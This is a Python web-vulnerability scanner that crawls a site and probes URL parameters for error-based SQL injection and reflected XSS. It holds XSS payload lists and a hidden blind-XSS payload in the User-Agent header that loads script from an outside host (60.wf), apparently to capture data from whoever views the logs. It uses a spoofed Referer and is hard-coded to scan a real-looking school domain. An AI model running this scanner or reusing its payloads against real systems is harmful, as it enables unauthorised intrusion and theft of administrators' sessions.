#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = w8ay

from bs4 import BeautifulSoup
import urllib.parse
from urllib import parse as urlencode
import re
import requests
import random


class spiderMain(object):

    def __init__(self, url):
        self.SIMILAR_SET = set()
        self.link = url

    def judge(self, url):
        # 先将URL链接，然后判断是否在origin
        # 在判断?/aspx/asp/php/jsp 是否在里面
        origin = self.link
        new_url = urllib.parse.urljoin(origin, url)
        domain = urllib.parse.urlparse(origin).netloc

        if domain not in new_url:
            return False
        if self.url_similar_check(new_url) == False:
            return False
        if '=' in new_url and ('aspx' in new_url or 'asp' in new_url or 'php' in new_url or 'jsp' in new_url):
            return new_url
        else:
            return False

    def url_similar_check(self, url):
        '''
        URL相似度分析
        当url路径和参数键值类似时，则判为重复
        '''
        url_struct = urllib.parse.urlparse(url)
        query_key = '|'.join(sorted([i.split('=')[0] for i in url_struct.query.split('&')]))
        url_hash = hash(url_struct.path + query_key)
        if url_hash not in self.SIMILAR_SET:
            self.SIMILAR_SET.add(url_hash)
            return True
        return False

    def run(self):
        header = dict()
        header[
            "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Referer"] = "http://www.qq.com"
        new_urls = set()
        try:
            r = requests.get(self.link, headers=header, timeout=5)
            if r.status_code == 200:
                soup = BeautifulSoup(r.text, 'html.parser')

                links = soup.find_all('a')
                for link in links:
                    new_url = link.get('href')
                    full_url = self.judge(new_url)
                    if full_url:
                        new_urls.add(full_url)
            else:
                return False
        except Exception:
            return False
        finally:
            if new_urls:
                return new_urls
            else:
                return False


class dbms:
    DB2 = 'IBM DB2 database'
    MSSQL = 'MsSQL database'
    ORACLE = 'Oracle database'
    SYBASE = 'Sybase database'
    POSTGRE = 'PostgreSQL database'
    MYSQL = 'MySQL database'
    JAVA = 'Java connector'
    ACCESS = 'Access database'
    INFORMIX = 'Informix database'
    INTERBASE = 'Interbase database'
    DMLDATABASE = 'DML Language database'
    UNKNOWN = 'Unknown database'


def Error_sqli(url, html):
    parse = urllib.parse.urlparse(url)
    if not parse.query:
        return False
    for path in parse.query.split('&'):
        if '=' not in path:
            continue
        k, v = path.split('=')
        quotes = '\''
        try:
            url_1 = url.replace("%s=%s" % (k, v), "%s=%s" % (k, urlencode.quote(v + quotes)))
            header = dict()
            header[
                "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt>/SrC=//60.wf/4PrhD>"
            header["Referer"] = "http://www.qq.com"
            html2 = requests.get(url_1, headers=header, timeout=5).text
            for sql_regex, dbms_type in Get_sql_errors():
                match1 = sql_regex.search(html)
                match2 = sql_regex.search(html2)
                if match2 and not match1:
                    return "发现%s存在报错型注入  参数为:%s  %s" % (dbms_type, k, url)
        except Exception:
            pass
    return False


def Error_xss(url):
    proxies = {'http': '127.0.0.1:9999'}
    header = dict()
    ran_a = random.randint(0, 200000)
    payloadList = ['"><script>prompt(%d)</script>' % ran_a,
                   '"><img src=x onerror=prompt(%d)>' % ran_a,
                   '"><svg/onload=prompt(%d)>' % ran_a
                   ]
    header[
        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"

    header["Referer"] = url

    parse = urllib.parse.urlparse(url)

    if not parse.query:
        return False

    for path in parse.query.split('&'):

        if '=' not in path:
            continue

        try:

            k, v = path.split('=')
        except:

            continue

        for payload in payloadList:

            new_url = url.replace("%s=%s" % (k, v), "%s=%s" % (k, v + payload))

            try:

                html = requests.get(new_url, headers=header, allow_redirects=False, ).text

                if payload in html:
                    log = "可能存在XSS %s key:%s payload:%s" % (new_url, k, v + payload)

                    return log

            except:

                pass

    return False


def Get_sql_errors():
    errors = []
    # Access
    errors.append(('Syntax error in query expression', dbms.ACCESS))
    errors.append(('Data type mismatch in criteria expression.', dbms.ACCESS))
    errors.append(('Microsoft JET Database Engine', dbms.ACCESS))
    errors.append(('\\[Microsoft\\]\\[ODBC Microsoft Access Driver\\]', dbms.ACCESS))

    # ASP / MSSQL
    errors.append(('System\.Data\.OleDb\.OleDbException', dbms.MSSQL))
    errors.append(('\\[SQL Server\\]', dbms.MSSQL))
    errors.append(('\\[Microsoft\\]\\[ODBC SQL Server Driver\\]', dbms.MSSQL))
    errors.append(('\\[SQLServer JDBC Driver\\]', dbms.MSSQL))
    errors.append(('\\[SqlException', dbms.MSSQL))
    errors.append(('System.Data.SqlClient.SqlException', dbms.MSSQL))
    errors.append(('Unclosed quotation mark after the character string', dbms.MSSQL))
    errors.append(("'80040e14'", dbms.MSSQL))
    errors.append(('mssql_query\\(\\)', dbms.MSSQL))
    errors.append(('odbc_exec\\(\\)', dbms.MSSQL))
    errors.append(('Microsoft OLE DB Provider for ODBC Drivers', dbms.MSSQL))
    errors.append(('Microsoft OLE DB Provider for SQL Server', dbms.MSSQL))
    errors.append(('Incorrect syntax near', dbms.MSSQL))
    errors.append(('Sintaxis incorrecta cerca de', dbms.MSSQL))
    errors.append(('Syntax error in string in query expression', dbms.MSSQL))
    errors.append(('ADODB\\.Field \\(0x800A0BCD\\)<br>', dbms.MSSQL))
    errors.append(("Procedure '[^']+' requires parameter '[^']+'", dbms.MSSQL))
    errors.append(("ADODB\\.Recordset'", dbms.MSSQL))
    errors.append(("Unclosed quotation mark before the character string", dbms.MSSQL))

    # DB2
    errors.append(('SQLCODE', dbms.DB2))
    errors.append(('DB2 SQL error:', dbms.DB2))
    errors.append(('SQLSTATE', dbms.DB2))
    errors.append(('\\[IBM\\]\\[CLI Driver\\]\\[DB2/6000\\]', dbms.DB2))
    errors.append(('\\[CLI Driver\\]', dbms.DB2))
    errors.append(('\\[DB2/6000\\]', dbms.DB2))

    # Sybase
    errors.append(("Sybase message:", dbms.SYBASE))

    # ORACLE
    errors.append(('(PLS|ORA)-[0-9][0-9][0-9][0-9]', dbms.ORACLE))

    # POSTGRE
    errors.append(('PostgreSQL query failed:', dbms.POSTGRE))
    errors.append(('supplied argument is not a valid PostgreSQL result', dbms.POSTGRE))
    errors.append(('pg_query\\(\\) \\[:', dbms.POSTGRE))
    errors.append(('pg_exec\\(\\) \\[:', dbms.POSTGRE))

    # MYSQL
    errors.append(('supplied argument is not a valid MySQL', dbms.MYSQL))
    errors.append(('Column count doesn\'t match value count at row', dbms.MYSQL))
    errors.append(('mysql_fetch_array\\(\\)', dbms.MYSQL))
    errors.append(('mysql_', dbms.MYSQL))
    errors.append(('on MySQL result index', dbms.MYSQL))
    errors.append(('You have an error in your SQL syntax;', dbms.MYSQL))
    errors.append(('You have an error in your SQL syntax near', dbms.MYSQL))
    errors.append(('MySQL server version for the right syntax to use', dbms.MYSQL))
    errors.append(('\\[MySQL\\]\\[ODBC', dbms.MYSQL))
    errors.append(("Column count doesn't match", dbms.MYSQL))
    errors.append(("the used select statements have different number of columns", dbms.MYSQL))
    errors.append(("Table '[^']+' doesn't exist", dbms.MYSQL))

    # Informix
    errors.append(('com\\.informix\\.jdbc', dbms.INFORMIX))
    errors.append(('Dynamic Page Generation Error:', dbms.INFORMIX))
    errors.append(('An illegal character has been found in the statement', dbms.INFORMIX))

    errors.append(('<b>Warning</b>:  ibase_', dbms.INTERBASE))
    errors.append(('Dynamic SQL Error', dbms.INTERBASE))

    # DML
    errors.append(('\\[DM_QUERY_E_SYNTAX\\]', dbms.DMLDATABASE))
    errors.append(('has occurred in the vicinity of:', dbms.DMLDATABASE))
    errors.append(('A Parser Error \\(syntax error\\)', dbms.DMLDATABASE))

    # Java
    errors.append(('java\\.sql\\.SQLException', dbms.JAVA))
    errors.append(('Unexpected end of command in statement', dbms.JAVA))

    # Coldfusion
    errors.append(('\\[Macromedia\\]\\[SQLServer JDBC Driver\\]', dbms.MSSQL))

    # Generic errors..
    errors.append(('SELECT .*? FROM .*?', dbms.UNKNOWN))
    errors.append(('UPDATE .*? SET .*?', dbms.UNKNOWN))
    errors.append(('INSERT INTO .*?', dbms.UNKNOWN))
    errors.append(('Unknown column', dbms.UNKNOWN))
    errors.append(('where clause', dbms.UNKNOWN))
    errors.append(('SqlServer', dbms.UNKNOWN))
    sql_errors = []
    for re_string, dbms_type in errors:
        sql_errors.append((re.compile(re_string, re.IGNORECASE), dbms_type))
    return sql_errors


def check(urls):
    c = []
    for url in urls:
        header = dict()
        header[
            "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
        header["Referer"] = "http://www.qq.com"
        try:
            html = requests.get(url, headers=header, timeout=5).text
            s1 = Error_sqli(url, html)
            if s1:
                c.append(s1)
            s2 = Error_xss(url)
            if s2:
                c.append(s2)
        except:
            return False
    return c


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if not url.endswith('/'):
        url = url + "/"
    s = spiderMain(url)
    f = s.run()
    if f:
        result = check(f)
        if result:
            if len(result) > 3:
                return result[0:3]
            else:
                return result


if __name__ == "__main__":
    a = poc('http://www.jaskz.edu.sh.cn')
    print(a)
